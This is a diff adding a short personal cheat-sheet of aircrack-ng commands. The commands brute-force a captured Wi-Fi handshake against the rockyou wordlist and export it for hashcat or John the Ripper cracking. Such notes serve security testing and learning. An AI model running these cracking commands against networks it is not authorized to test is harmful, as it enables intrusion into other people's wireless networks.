@@ -1,0 +1,8 @@
+### aircrack ###
+## brute force
+aircrack-ng -b "02:1A:11:FF:D9:BD" -w ~/perso/secu/dict/rockyou.txt file.cap
+aircrack-ng -z file.cap -0 -w ~/perso/secu/dict/rockyou.txt
+
+## hachcat/john
+aircrack-ng -b "02:1A:11:FF:D9:BD" -j out file.cap
+hccapx2john out.hccapx > out
